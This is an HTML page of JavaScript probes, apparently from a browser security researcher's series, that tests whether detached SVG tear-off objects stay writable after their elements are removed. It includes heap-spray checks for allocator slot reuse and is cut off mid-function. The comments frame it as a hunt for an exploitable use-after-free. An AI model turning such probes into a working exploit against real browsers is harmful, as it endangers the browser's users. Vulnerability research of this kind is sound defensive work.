<!DOCTYPE html>
<html>
<head>

<title>SVG UAF v78 — SVGRect/SVGAnimatedLength TearOff deep probe</title>
<style>
*{box-sizing:border-box}
body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:12px;padding:12px;margin:0}
h2{color:#00ff88;margin:6px 0;font-size:14px}
#controls{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px}
button{background:#1a1a2e;color:#00ff88;border:1px solid #00ff88;padding:6px 12px;font-family:monospace;font-size:12px;cursor:pointer;border-radius:3px}

#out{border:1px solid #222;padding:8px;min-height:100px;max-height:72vh;overflow-y:auto}

<body>
<h2>SVG UAF v78 — SVGRect + SVGAnimatedLength TearOff deep probe (ADR119 HIT followup)</h2>
<div id="controls">
  <button class="run-all" onclick="runAll()">▶ Run All</button>
  <button onclick="runSuite('ADR120')">ADR120: SVGRect viewBox — stale write propagation + re-add + attr corruption</button>
  <button onclick="runSuite('ADR121')">ADR121: SVGAnimatedLength (svg.width/height/x/y) — all survive removal?</button>
  <button onclick="runSuite('ADR122')">ADR122: rect.width.baseVal — stale write timing + DOM propagation</button>
  <button onclick="runSuite('ADR123')">ADR123: SVGRect extreme values — negative/zero/MAX_FLOAT viewport corruption</button>
  <button onclick="runSuite('ADR124')">ADR124: viewBox TearOff — write then re-attach svg — does corrupted viewBox render?</button>
  <button onclick="runSuite('ADR125')">ADR125: multiple svg viewBox TearOffs — cross-contamination after remove</button>
  <button onclick="runSuite('ADR126')">ADR126: animVal TearOff data write (ADR116 followup) — propagation probe</button>
  <button class="copy-btn" onclick="copyAll()">⎘ Copy All</button>
  <button class="clear-btn" onclick="clearOut()">✕ Clear</button>
</div>
<div id="out"></div>
<div id="copy-toast">Copied!</div>
<script>
window.onerror=function(msg,src,line,col,err){
  var d=document.getElementById('out');if(d){var p=document.createElement('pre');p.className='miss';p.textContent='[GLOBAL ERR] '+msg+' @ line '+line+(err&&err.stack?'\n'+err.stack:'');d.appendChild(p);d.scrollTop=d.scrollHeight;}return false;
};
var SVG_NS='http://www.w3.org/2000/svg';
function L(s,cls){var d=document.getElementById('out');var p=document.createElement('pre');if(cls)p.className=cls;p.textContent=s;d.appendChild(p);d.scrollTop=d.scrollHeight;}
function clearOut(){document.getElementById('out').innerHTML='';}
function copyAll(){
  var lines=document.getElementById('out').querySelectorAll('pre');
  var text=Array.from(lines).map(function(p){return p.textContent;}).join('\n');
  var toast=document.getElementById('copy-toast');
  try{navigator.clipboard.writeText(text).then(function(){toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);}).catch(function(){fb(text,toast);});}catch(e){fb(text,toast);}
}
function fb(text,toast){var ta=document.createElement('textarea');ta.value=text;ta.style.cssText='position:fixed;top:-9999px';document.body.appendChild(ta);ta.select();try{document.execCommand('copy');toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);}catch(e){}document.body.removeChild(ta);}
function timeWrite(writeFn,label,ITER){
  ITER=ITER||500;
  var t0=performance.now();
  for(var i=0;i<ITER;i++) try{writeFn(i);}catch(e){L(label+': THREW at i='+i+': '+e.message,'warn');return -1;}
  var t1=performance.now();
  var ms=(t1-t0).toFixed(2);
  var us=((t1-t0)*1000/ITER).toFixed(1);
  L(label+': '+ms+'ms ('+us+'µs/write) '+(t1-t0>0.5?'★ALIVE':''),'info');
  return t1-t0;
}
var suites={};
function runSuite(name){L('','');L('══ '+name+' ══════════════════════════════════','suite-hdr');try{suites[name]();}catch(e){L('[SUITE CRASH] '+name+': '+(e&&e.stack?e.stack:String(e)),'miss');}}
function runAll(){['ADR120','ADR121','ADR122','ADR123','ADR124','ADR125','ADR126'].forEach(function(n){runSuite(n);});}

// ═══════════════════════════════════════════════════════════════
// ADR120 — SVGRect viewBox stale write: propagation + re-add + attr check
//
// v77 ADR119 confirmed: svg.viewBox.baseVal (SVGRect TearOff) stays
// WRITABLE after svg.remove(). Timing = 1ms (ALIVE).
//
// Now we need to know:
// 1. Does the stale write propagate to the viewBox attribute?
//    - Read svg.getAttribute('viewBox') after stale write to R_bv
//    - If it shows the written value → notification chain still alive
//      even after svg removed from DOM!
//
// 2. After stale write, re-attach svg to DOM.
//    - What viewBox does svg have after re-attachment?
//    - The written value? The original? Something corrupt?
//
// 3. After re-attachment, does the svg RENDER with the written viewBox?
//    - getScreenCTM on a child element should reflect the viewBox
//
// 4. Multi-write: write extremely large values then re-attach.
//    Does the svg behave normally or has the viewBox state been corrupted?
//
// 5. Timing: how long does the TearOff stay alive?
//    - Write immediately after remove
//    - Write after 100 intermediate operations
//    - Write after GC
//    Each time: is it still writable?
// ═══════════════════════════════════════════════════════════════
suites['ADR120']=function(){
  L('ADR120: SVGRect viewBox stale write — propagation + re-add + corruption','info');
  var container=document.createElement('div');
  document.body.appendChild(container);

  var svg=document.createElementNS(SVG_NS,'svg');
  svg.setAttribute('viewBox','0 0 1000 1000');
  svg.setAttribute('width','200');svg.setAttribute('height','200');
  var rect=document.createElementNS(SVG_NS,'rect');
  rect.setAttribute('x','0');rect.setAttribute('y','0');
  rect.setAttribute('width','100');rect.setAttribute('height','100');
  svg.appendChild(rect);
  container.appendChild(svg);

  // Baseline: viewBox values
  var R_bv=svg.viewBox.baseVal;
  L('ADR120: R_bv before remove: x='+R_bv.x+' y='+R_bv.y+' w='+R_bv.width+' h='+R_bv.height,'info');
  L('ADR120: getAttribute viewBox: '+svg.getAttribute('viewBox'),'info');

  // CTM before remove
  var ctm0=rect.getScreenCTM();
  L('ADR120: rect CTM before remove: a='+ctm0.a.toFixed(4)+' e='+ctm0.e.toFixed(2),'info');

  // Remove svg from DOM
  container.removeChild(svg);
  L('ADR120: svg removed','info');

  // Immediate stale write — CANARY value
  var CANARY_W=55555, CANARY_H=66666;
  var wrote=false;
  try{
    R_bv.x=0; R_bv.y=0; R_bv.width=CANARY_W; R_bv.height=CANARY_H;
    wrote=true;
    L('ADR120: stale write OK: x=0 y=0 w='+CANARY_W+' h='+CANARY_H,'info');
  }catch(e){L('ADR120: stale write THREW: '+e.message,'warn');}

  if(wrote){
    // Read back from TearOff
    L('ADR120: R_bv after write: w='+R_bv.width+' h='+R_bv.height,'info');

    // Check getAttribute — does write propagate to DOM attr?
    L('ADR120: getAttribute(viewBox) after stale write: '+svg.getAttribute('viewBox'),'info');
    if(svg.getAttribute('viewBox').indexOf(CANARY_W)!==-1||
       svg.getAttribute('viewBox').indexOf(String(CANARY_W))!==-1){
      L('★★★ ADR120: STALE WRITE PROPAGATED TO DOM ATTRIBUTE! Notification chain alive!','hit');
    } else {
      L('ADR120: DOM attr NOT updated by stale write. Data stored in TearOff only.','info');
    }

    // Check via viewBox property again
    L('ADR120: svg.viewBox.baseVal.width after stale write = '+svg.viewBox.baseVal.width,'info');
    // Is it the same object?
    L('ADR120: R_bv === svg.viewBox.baseVal? '+(R_bv===svg.viewBox.baseVal),'info');
  }

  // Re-attach svg to DOM
  container.appendChild(svg);
  L('ADR120: svg re-attached to DOM','info');

  // Read viewBox after re-attachment
  L('ADR120: getAttribute(viewBox) after re-attach: '+svg.getAttribute('viewBox'),'info');
  L('ADR120: R_bv.width after re-attach: '+R_bv.width,'info');
  L('ADR120: svg.viewBox.baseVal.width after re-attach: '+svg.viewBox.baseVal.width,'info');

  // CTM after re-attachment — does it reflect the stale-written viewBox?
  try{
    var ctm1=rect.getScreenCTM();
    L('ADR120: rect CTM after re-attach: a='+ctm1.a.toFixed(4)+' e='+ctm1.e.toFixed(2),'info');
    // Original CTM.a was 200/1000 = 0.2 (svg width / viewBox width)
    // If viewBox.width is now 55555, new CTM.a should be 200/55555 ≈ 0.0036
    if(Math.abs(ctm1.a)<0.01&&ctm1.a>0){
      L('★★★ ADR120: CTM REFLECTS STALE VIEWBOX! svg renders with corrupted viewport!','hit');
    } else if(Math.abs(ctm1.a-0.2)<0.01){
      L('ADR120: CTM reverted to original viewBox (safe path, viewBox restored on re-attach)','info');
    } else {
      L('ADR120: CTM.a='+ctm1.a.toFixed(6)+' (unexpected — check manually)','warn');
    }
  }catch(e){L('ADR120: CTM after re-attach threw: '+e.message,'warn');}

  // Timing: are writes after GC still alive?
  container.removeChild(svg);
  try{var gc=[];for(var i=0;i<30000;i++)gc.push(new Uint8Array(512));gc=null;if(window.gc)window.gc();}catch(e){}
  L('ADR120: GC applied after re-remove','info');

  var tGC=timeWrite(function(i){R_bv.width=i+1000;R_bv.height=i+2000;},'ADR120: R_bv write AFTER GC',500);
  if(tGC>0.5) L('★★★ ADR120: R_bv STILL ALIVE AFTER GC! Very long-lived TearOff!','hit');
  else if(tGC<0) L('ADR120: R_bv write threw after GC (context killed by GC)','info');
  else L('ADR120: R_bv dead after GC (GC killed TearOff context)','info');

  container.remove();
};

// ═══════════════════════════════════════════════════════════════
// ADR121 — SVGAnimatedLength (svg.width/height/x/y) — all survive removal?
//
// An SVG element has several SVGAnimatedLength attributes:
// - svg.width.baseVal → SVGLength TearOff (presentational width)
// - svg.height.baseVal → SVGLength TearOff
// - svg.x.baseVal → SVGLength TearOff
// - svg.y.baseVal → SVGLength TearOff
//
// These are different from viewBox (SVGAnimatedRect). They're
// SVGAnimatedLength — the same type as rect.width.baseVal.
//
// v77 ADR119 crashed when trying to write to R_av (animVal) and
// rect.width.baseVal AFTER the error. But the viewBox baseVal
// survived. Do these also survive?
//
// Also testing: nested svg. An inner svg inside outer svg.
// Remove the inner svg. Do its TearOffs survive?
// Remove the outer svg. Do both inner and outer TearOffs survive?
// ═══════════════════════════════════════════════════════════════
suites['ADR121']=function(){
  L('ADR121: SVGAnimatedLength (svg.width/height/x/y) — stale writes after remove','info');
  var container=document.createElement('div');
  document.body.appendChild(container);

  var svg=document.createElementNS(SVG_NS,'svg');
  svg.setAttribute('width','200');svg.setAttribute('height','200');
  svg.setAttribute('x','0');svg.setAttribute('y','0');
  svg.setAttribute('viewBox','0 0 200 200');
  container.appendChild(svg);

  // Grab all SVGAnimatedLength TearOffs
  var W_bv=svg.width.baseVal;
  var H_bv=svg.height.baseVal;
  var X_bv=svg.x.baseVal;
  var Y_bv=svg.y.baseVal;

  L('ADR121: W='+W_bv.value+' H='+H_bv.value+' X='+X_bv.value+' Y='+Y_bv.value,'info');

  // Baseline timing
  var tW0=timeWrite(function(i){W_bv.value=i+100;},'ADR121: baseline W_bv.value write',200);

  // Remove svg
  container.removeChild(svg);
  L('ADR121: svg removed','info');

  // Test each TearOff
  var tW=timeWrite(function(i){W_bv.value=i+11111;},'ADR121: W_bv stale write',500);
  if(tW>0.5) L('★★★ ADR121: svg.width.baseVal ALIVE!','hit');

  var tH=timeWrite(function(i){H_bv.value=i+22222;},'ADR121: H_bv stale write',500);
  if(tH>0.5) L('★★★ ADR121: svg.height.baseVal ALIVE!','hit');

  var tX=timeWrite(function(i){X_bv.value=i+33333;},'ADR121: X_bv stale write',500);
  if(tX>0.5) L('★★★ ADR121: svg.x.baseVal ALIVE!','hit');

  var tY=timeWrite(function(i){Y_bv.value=i+44444;},'ADR121: Y_bv stale write',500);
  if(tY>0.5) L('★★★ ADR121: svg.y.baseVal ALIVE!','hit');

  // Read back values after writes
  L('ADR121: W_bv.value after stale writes='+W_bv.value,'info');
  L('ADR121: H_bv.value after stale writes='+H_bv.value,'info');

  // getAttribute to check propagation
  L('ADR121: getAttribute(width) after stale write='+svg.getAttribute('width'),'info');
  L('ADR121: getAttribute(height) after stale write='+svg.getAttribute('height'),'info');

  // Check animVal — is it read-only or writable?
  var W_av=svg.width.animVal;
  var tWav=timeWrite(function(i){try{W_av.value=i+99999;}catch(e){throw e;}},'ADR121: W_av stale write (animVal)',100);
  L('ADR121: W_av.value after write attempt='+W_av.value,'info');

  // NESTED SVG: inner svg inside outer
  var outer=document.createElementNS(SVG_NS,'svg');
  outer.setAttribute('width','400');outer.setAttribute('height','400');
  container.appendChild(outer);
  var inner=document.createElementNS(SVG_NS,'svg');
  inner.setAttribute('width','200');inner.setAttribute('height','200');
  outer.appendChild(inner);

  var IW=inner.width.baseVal;
  var OW=outer.width.baseVal;
  L('ADR121: nested: IW='+IW.value+' OW='+OW.value,'info');

  // Remove inner only
  outer.removeChild(inner);
  var tIW=timeWrite(function(i){IW.value=i+55555;},'ADR121: inner.W_bv after inner removed',500);
  if(tIW>0.5) L('★★★ ADR121: INNER svg.width.baseVal ALIVE after inner removed!','hit');

  // Remove outer (inner already removed)
  container.removeChild(outer);
  var tOW=timeWrite(function(i){OW.value=i+66666;},'ADR121: outer.W_bv after outer removed',500);
  if(tOW>0.5) L('★★★ ADR121: OUTER svg.width.baseVal ALIVE after outer removed!','hit');

  L('ADR121: IW.value='+IW.value+' OW.value='+OW.value,'info');
  container.remove();
};

// ═══════════════════════════════════════════════════════════════
// ADR122 — rect.width.baseVal — deep stale timing + DOM propagation
//
// v77 ADR119 crashed mid-run when trying to write to rect.width.baseVal.
// The GLOBAL ERR was NoModificationAllowedError at line 782 — that was
// the animVal write (R_av is read-only). We never got timing for rect.
//
// This suite properly tests rect (and other shape) SVGAnimatedLength:
// - rect.width, rect.height, rect.x, rect.y (all SVGAnimatedLength)
// - circle.cx, circle.cy, circle.r
// - line.x1, line.y1, line.x2, line.y2
// - ellipse.rx, ellipse.ry
//
// Remove the shape from DOM → time stale writes → check propagation
// to getAttribute.
//
// Key question: after stale write to shape.width.baseVal:
// 1. Does the written value appear in getAttribute('width')? (notification fires)
// 2. Does it NOT appear? (data stored in TearOff only, same as SVGTransform)
// 3. Is the TearOff alive at all? (v77 was ambiguous due to crash)
// ═══════════════════════════════════════════════════════════════
suites['ADR122']=function(){
  L('ADR122: shape SVGAnimatedLength stale writes — rect/circle/line/ellipse','info');
  var svg=document.createElementNS(SVG_NS,'svg');
  svg.setAttribute('viewBox','0 0 1000 1000');svg.setAttribute('width','200');svg.setAttribute('height','200');
  document.body.appendChild(svg);

  // RECT
  var rect=document.createElementNS(SVG_NS,'rect');
  rect.setAttribute('x','10');rect.setAttribute('y','20');
  rect.setAttribute('width','300');rect.setAttribute('height','400');
  svg.appendChild(rect);

  var RW=rect.width.baseVal, RH=rect.height.baseVal;
  var RX=rect.x.baseVal, RY=rect.y.baseVal;
  L('ADR122[rect]: W='+RW.value+' H='+RH.value+' X='+RX.value+' Y='+RY.value,'info');

  var tRW0=timeWrite(function(i){RW.value=i+100;},'ADR122[rect]: baseline RW.value write',200);

  svg.removeChild(rect);
  L('ADR122[rect]: rect removed','info');

  var tRW=timeWrite(function(i){RW.value=i+11111;},'ADR122[rect]: RW stale write',500);
  if(tRW>0.5) L('★★★ ADR122[rect]: rect.width.baseVal ALIVE!','hit');

  var tRH=timeWrite(function(i){RH.value=i+22222;},'ADR122[rect]: RH stale write',500);
  if(tRH>0.5) L('★★★ ADR122[rect]: rect.height.baseVal ALIVE!','hit');

  L('ADR122[rect]: RW.value after writes='+RW.value,'info');
  L('ADR122[rect]: getAttribute(width)='+rect.getAttribute('width'),'info');
  if(rect.getAttribute('width')&&rect.getAttribute('width').indexOf('11')===0){
    L('★★★ ADR122[rect]: WRITE PROPAGATED TO ATTR!','hit');
  }

  // CIRCLE
  var circle=document.createElementNS(SVG_NS,'circle');
  circle.setAttribute('cx','100');circle.setAttribute('cy','100');circle.setAttribute('r','50');
  svg.appendChild(circle);

  var CX=circle.cx.baseVal, CY=circle.cy.baseVal, CR=circle.r.baseVal;
  L('ADR122[circle]: cx='+CX.value+' cy='+CY.value+' r='+CR.value,'info');

  svg.removeChild(circle);
  var tCX=timeWrite(function(i){CX.value=i+33333;},'ADR122[circle]: cx stale write',500);
  if(tCX>0.5) L('★★★ ADR122[circle]: circle.cx.baseVal ALIVE!','hit');

  var tCR=timeWrite(function(i){CR.value=i+44444;},'ADR122[circle]: r stale write',500);
  if(tCR>0.5) L('★★★ ADR122[circle]: circle.r.baseVal ALIVE!','hit');

  L('ADR122[circle]: CX.value='+CX.value+' CR.value='+CR.value,'info');

  // LINE
  var line=document.createElementNS(SVG_NS,'line');
  line.setAttribute('x1','0');line.setAttribute('y1','0');
  line.setAttribute('x2','500');line.setAttribute('y2','500');
  svg.appendChild(line);

  var LX1=line.x1.baseVal, LY1=line.y1.baseVal;
  var LX2=line.x2.baseVal, LY2=line.y2.baseVal;
  L('ADR122[line]: x1='+LX1.value+' y1='+LY1.value+' x2='+LX2.value+' y2='+LY2.value,'info');

  svg.removeChild(line);
  var tLX2=timeWrite(function(i){LX2.value=i+55555;},'ADR122[line]: x2 stale write',500);
  if(tLX2>0.5) L('★★★ ADR122[line]: line.x2.baseVal ALIVE!','hit');

  L('ADR122[line]: LX2.value='+LX2.value,'info');

  // ELLIPSE
  var ell=document.createElementNS(SVG_NS,'ellipse');
  ell.setAttribute('cx','200');ell.setAttribute('cy','200');
  ell.setAttribute('rx','100');ell.setAttribute('ry','50');
  svg.appendChild(ell);

  var ERX=ell.rx.baseVal, ERY=ell.ry.baseVal;
  L('ADR122[ellipse]: rx='+ERX.value+' ry='+ERY.value,'info');

  svg.removeChild(ell);
  var tERX=timeWrite(function(i){ERX.value=i+66666;},'ADR122[ellipse]: rx stale write',500);
  if(tERX>0.5) L('★★★ ADR122[ellipse]: ellipse.rx.baseVal ALIVE!','hit');

  L('ADR122[ellipse]: ERX.value='+ERX.value,'info');

  svg.remove();
};

// ═══════════════════════════════════════════════════════════════
// ADR123 — SVGRect extreme values — negative/zero/MAX_FLOAT viewport corruption
//
// SVGRect for viewBox has constraints: width and height MUST be > 0.
// Writing 0 or negative should be an error, or silently clamped.
// Writing MAX_FLOAT should wrap or produce INF/NaN in the matrix.
//
// After stale write of extreme values, re-attach svg to DOM.
// Does the svg try to set up a coordinate system with 0-size or
// negative viewBox? This could cause division by zero in the
// transform matrix calculation (CTM.a = svgWidth / viewBox.width).
// Division by zero → INF in the matrix → child elements get INF CTM.
//
// Test values:
// - viewBox.width = 0 → CTM.a = width / 0 = INF
// - viewBox.width = -1 → negative scale factor
// - viewBox.width = 1e308 → CTM.a ≈ 0 (underflow)
// - viewBox.width = NaN → undefined behavior
// - viewBox.width = Infinity → CTM.a = 0
//
// If any of these produce NaN or INF in child CTMs that's exploitable
// for pointer arithmetic in geometry calculations.
// ═══════════════════════════════════════════════════════════════
suites['ADR123']=function(){
  L('ADR123: SVGRect extreme values — viewport corruption probe','info');
  var container=document.createElement('div');
  document.body.appendChild(container);

  function testViewBox(label, x, y, w, h){
    var svg=document.createElementNS(SVG_NS,'svg');
    svg.setAttribute('viewBox','0 0 1000 1000');
    svg.setAttribute('width','200');svg.setAttribute('height','200');
    var child=document.createElementNS(SVG_NS,'rect');
    child.setAttribute('x','0');child.setAttribute('y','0');
    child.setAttribute('width','100');child.setAttribute('height','100');
    svg.appendChild(child);
    container.appendChild(svg);

    var R=svg.viewBox.baseVal;
    var ctmBefore=child.getScreenCTM();
    L('ADR123['+label+']: CTM before: a='+ctmBefore.a.toFixed(4)+' e='+ctmBefore.e.toFixed(2),'info');

    container.removeChild(svg);
    try{R.x=x;R.y=y;R.width=w;R.height=h;}catch(e){L('ADR123['+label+']: stale write threw: '+e.message,'warn');container.appendChild(svg);svg.remove();return;}

    L('ADR123['+label+']: wrote x='+x+' y='+y+' w='+w+' h='+h,'info');
    L('ADR123['+label+']: R.x='+R.x+' R.width='+R.width,'info');
    L('ADR123['+label+']: getAttribute: '+svg.getAttribute('viewBox'),'info');

    // Re-attach and check CTM
    container.appendChild(svg);
    try{
      var ctmAfter=child.getScreenCTM();
      var aVal=ctmAfter.a;
      L('ADR123['+label+']: CTM after re-attach: a='+aVal+' e='+ctmAfter.e.toFixed(2)+' f='+ctmAfter.f.toFixed(2),'info');
      if(!isFinite(aVal)||isNaN(aVal)||Math.abs(aVal)>1e6){
        L('★★★ ADR123['+label+']: ANOMALOUS CTM.a='+aVal+' after extreme viewBox!','hit');
      }
    }catch(e){L('ADR123['+label+']: CTM threw after re-attach: '+e.message,'warn');}

    container.removeChild(svg);
    svg.remove();
  }

  testViewBox('zero-width',0,0,0,1000);
  testViewBox('zero-height',0,0,1000,0);
  testViewBox('negative-width',0,0,-1,1000);
  testViewBox('negative-height',0,0,1000,-1);
  testViewBox('MAX_FLOAT',0,0,Number.MAX_VALUE,Number.MAX_VALUE);
  testViewBox('Infinity',0,0,Infinity,Infinity);
  testViewBox('NaN',0,0,NaN,NaN);
  testViewBox('very-large',0,0,1e15,1e15);
  testViewBox('neg-origin',-1e9,-1e9,1000,1000);

  container.remove();
};

// ═══════════════════════════════════════════════════════════════
// ADR124 — viewBox TearOff: write → re-attach → rendering corruption
//
// More focused version of ADR120 re-attach test.
// Write CANARY to viewBox.baseVal after remove, then re-attach.
//
// Key thing to check: after re-attachment, is there a window where
// the svg has BOTH the original DOM attribute value AND the TearOff
// value? The attribute says "0 0 1000 1000" but the TearOff says
// "0 0 55555 66666". Which one wins?
//
// Also: after re-attach, immediately write MORE to the TearOff.
// Does the TearOff go from "stale" mode back to "live" mode?
// If yes → we can corrupt the viewBox while it's in the DOM!
//
// Sequence:
// 1. Grab TearOff R
// 2. Remove svg
// 3. Write CANARY to R (stale write — survives per ADR119)
// 4. Re-attach svg
// 5. Write CANARY2 to R (is it still writable? Does it update the DOM now?)
// 6. Check getAttribute — does CANARY2 appear?
// ═══════════════════════════════════════════════════════════════
suites['ADR124']=function(){
  L('ADR124: viewBox TearOff — write after re-attach = in-DOM write?','info');
  var container=document.createElement('div');
  document.body.appendChild(container);

  var svg=document.createElementNS(SVG_NS,'svg');
  svg.setAttribute('viewBox','0 0 1000 1000');
  svg.setAttribute('width','200');svg.setAttribute('height','200');
  var child=document.createElementNS(SVG_NS,'rect');
  child.setAttribute('x','100');child.setAttribute('y','100');
  child.setAttribute('width','100');child.setAttribute('height','100');
  svg.appendChild(child);
  container.appendChild(svg);

  var R=svg.viewBox.baseVal;
  var ctm0=child.getScreenCTM();
  L('ADR124: initial CTM.a='+ctm0.a.toFixed(4)+' (should be 0.2 = 200/1000)','info');
  L('ADR124: getAttribute(viewBox): '+svg.getAttribute('viewBox'),'info');

  // Remove
  container.removeChild(svg);
  L('ADR124: svg removed','info');

  // Stale write
  var CANARY1=55555;
  try{R.width=CANARY1;R.height=CANARY1;}catch(e){L('ADR124: stale write1 threw: '+e.message,'warn');}
  L('ADR124: after stale write: R.width='+R.width,'info');
  L('ADR124: getAttribute after stale write: '+svg.getAttribute('viewBox'),'info');

  // Re-attach
  container.appendChild(svg);
  L('ADR124: svg re-attached','info');

  // Read state immediately after re-attach
  L('ADR124: getAttribute after re-attach: '+svg.getAttribute('viewBox'),'info');
  L('ADR124: R.width after re-attach: '+R.width,'info');
  var ctm1=child.getScreenCTM();
  L('ADR124: CTM after re-attach: a='+ctm1.a.toFixed(6)+' e='+ctm1.e.toFixed(2),'info');

  // Now write CANARY2 while svg IS in DOM — does TearOff work in-DOM?
  var CANARY2=77777;
  var wroteLive=false;
  try{
    R.width=CANARY2;R.height=CANARY2;
    wroteLive=true;
    L('ADR124: in-DOM write OK: R.width='+R.width,'info');
  }catch(e){L('ADR124: in-DOM write threw: '+e.message,'warn');}

  if(wroteLive){
    L('ADR124: getAttribute after in-DOM write: '+svg.getAttribute('viewBox'),'info');
    var ctm2=child.getScreenCTM();
    L('ADR124: CTM after in-DOM write: a='+ctm2.a.toFixed(6)+' e='+ctm2.e.toFixed(2),'info');
    if(svg.getAttribute('viewBox').indexOf(CANARY2)!==-1||
       svg.getAttribute('viewBox').indexOf(String(CANARY2))!==-1){
      L('★★★ ADR124: IN-DOM WRITE PROPAGATED TO ATTR!','hit');
    }
    if(Math.abs(ctm2.a-(200/CANARY2))<0.001){
      L('★★★ ADR124: CTM REFLECTS IN-DOM WRITE! Viewport corrupted while in DOM!','hit');
    }
  }

  // Timing: write vs remove/re-attach cycle repeated rapidly
  var writeCount=0, writeAlive=0;
  for(var cycle=0;cycle<10;cycle++){
    container.removeChild(svg);
    try{R.width=9999+cycle;R.height=9999+cycle;writeCount++;writeAlive++;}catch(e){writeCount++;}
    container.appendChild(svg);
  }
  L('ADR124: rapid cycle: '+writeAlive+'/'+writeCount+' writes succeeded during remove phases','info');
  L('ADR124: final getAttribute: '+svg.getAttribute('viewBox'),'info');

  container.remove();
};

// ═══════════════════════════════════════════════════════════════
// ADR125 — Multiple svg viewBox TearOffs — cross-contamination
//
// Create N svg elements, grab viewBox.baseVal TearOff for each.
// Remove all of them from DOM.
// Write DIFFERENT canary values to each TearOff.
// Check: do the TearOfs write to the RIGHT svg or is there confusion?
//
// Also: what if two svgs share the same viewBox C++ object?
// (unlikely but worth checking — same viewBox attribute value)
//
// More importantly: IsoHeap test for SVGRect.
// Remove N svgs, hold N TearOffs (keep references).
// Now create M new svgs.
// Check if any new svg's viewBox overlaps with old TearOff.
// (SVGRect IsoHeap — is it also bump-only, or does it recycle?)
// ═══════════════════════════════════════════════════════════════
suites['ADR125']=function(){
  L('ADR125: Multiple svg viewBox TearOffs — cross-contamination + IsoHeap','info');
  var container=document.createElement('div');
  document.body.appendChild(container);

  var N=20;
  var svgs=[], tearoffs=[];
  for(var i=0;i<N;i++){
    var s=document.createElementNS(SVG_NS,'svg');
    s.setAttribute('viewBox','0 0 '+(1000+i)+' '+(2000+i));
    s.setAttribute('width','10');s.setAttribute('height','10');
    container.appendChild(s);
    svgs.push(s);
    tearoffs.push(s.viewBox.baseVal);
  }
  L('ADR125: created '+N+' svgs and grabbed TearOffs','info');
  L('ADR125: tearoffs[0].width='+tearoffs[0].width+' tearoffs[N-1].width='+tearoffs[N-1].width,'info');

  // Remove all svgs
  for(var i=0;i<N;i++) container.removeChild(svgs[i]);
  L('ADR125: all svgs removed','info');

  // Write unique canary to each TearOff
  var CANARY_BASE=10000;
  var writeOk=0;
  for(var i=0;i<N;i++){
    try{tearoffs[i].width=CANARY_BASE+i;tearoffs[i].height=CANARY_BASE+i+N;writeOk++;}catch(e){}
  }
  L('ADR125: wrote canaries to '+writeOk+'/'+N+' TearOffs','info');

  // Read back and check for cross-contamination
  var contaminated=false;
  for(var i=0;i<N;i++){
    var expected=CANARY_BASE+i;
    var actual=tearoffs[i].width;
    if(Math.abs(actual-expected)>0.5){
      L('★★★ ADR125: TearOff['+i+'] CONTAMINATED! expected='+expected+' got='+actual,'hit');
      contaminated=true;
    }
  }
  if(!contaminated) L('ADR125: No cross-contamination. Each TearOff holds its own value.','info');

  // IsoHeap test: spray new svgs, check if sentinel TearOff is overwritten
  var sentinel=tearoffs[0];
  var sentinelPre=sentinel.width;// should be 10000
  L('ADR125: sentinel TearOff[0].width before spray = '+sentinelPre,'info');

  var SPRAY=100, newSvgs=[];
  for(var i=0;i<SPRAY;i++){
    var ns=document.createElementNS(SVG_NS,'svg');
    ns.setAttribute('viewBox','0 0 '+(99999+i)+' '+(88888+i));
    container.appendChild(ns);
    newSvgs.push(ns);
  }
  L('ADR125: sprayed '+SPRAY+' new svgs','info');

  var sentinelPost=sentinel.width;
  L('ADR125: sentinel.width after spray = '+sentinelPost,'info');
  if(Math.abs(sentinelPost-sentinelPre)>0.5){
    L('★★★ ADR125: SENTINEL OVERWRITTEN by spray! IsoHeap REUSES SVGRect slots!','hit');
    L('★★★ ADR125: sentinelPre='+sentinelPre+' sentinelPost='+sentinelPost,'hit');
  } else {
    L('ADR125: sentinel unchanged. SVGRect IsoHeap also bump-only.','info');
  }

  container.remove();
};

// ═══════════════════════════════════════════════════════════════
// ADR126 — animVal TearOff data write (ADR116 followup)
//
// ADR116 result: T_av0.tx = 33832 after writes.
// That means the animVal SVGTransform TearOff stored data.
// 33832 = 499 + 33333, which is the last write value.
// Timing = 0ms (no notification). Data stored but isolated.
//
// This is the same as ADR110 result (T_av4.tx = 100498 after stale writes).
// But in ADR116 the context was: baseVal.clear() had been called.
// So after clear(), the animVal TearOff for item[0] stored writes.
//
// New test:
// 1. What does the animVal TearOff RETURN for its tx after baseVal.clear()?
//    - Is it reading from the freed C++ SVGTransform?
//    - Or from a separate SVGTransform backing store?
// 2. Can we INFLUENCE the returned value by spraying with createSVGTransform()?
//    - If the freed SVGTransform slot is reused by a new createSVGTransform(),
//      and we write to the new one, does the animVal TearOff now return OUR value?
//    - This would be IsoHeap slot confusion — different from bump-only behavior
//      that SVGTransform normally shows.
// 3. Does the stored animVal value affect rendering?
//    - Set animVal TearOff to CANARY, then call getScreenCTM — does it use it?
// ═══════════════════════════════════════════════════════════════
suites['ADR126']=function(){
  L('ADR126: animVal TearOff data write (ADR116 followup) — spray + propagation','info');
  var svg=document.createElementNS(SVG_NS,'svg');
  svg.setAttribute('viewBox','0 0 1000 1000');svg.setAttribute('width','200');svg.setAttribute('height','200');
  document.body.appendChild(svg);

  // Add SMIL animate to make animVal truly differ from baseVal
  var g=document.createElementNS(SVG_NS,'g');
  g.setAttribute('transform','translate(111,222) translate(333,444)');
  svg.appendChild(g);

  var animEl=document.createElementNS(SVG_NS,'animateTransform');
  animEl.setAttribute('attributeName','transform');
  animEl.setAttribute('type','translate');
  animEl.setAttribute('from','111 222');
  animEl.setAttribute('to','500 600');
  animEl.setAttribute('dur','10s');
  animEl.setAttribute('repeatCount','indefinite');
  animEl.setAttribute('additive','sum');
  g.appendChild(animEl);

  requestAnimationFrame(function(){
    var TL_bv=g.transform.baseVal;
    var TL_av=g.transform.animVal;
    L('ADR126 f1: bv.N='+TL_bv.numberOfItems+' av.N='+TL_av.numberOfItems,'info');
    L('ADR126 f1: bv[0].tx='+TL_bv.getItem(0).matrix.e+' av[0].tx='+TL_av.getItem(0).matrix.e,'info');

    // Grab animVal TearOff for item[0]
    var T_av0=TL_av.getItem(0);
    var preClear_tx=T_av0.matrix.e;
    L('ADR126 f1: T_av0.tx before clear='+preClear_tx,'info');

    // Clear baseVal
    TL_bv.clear();
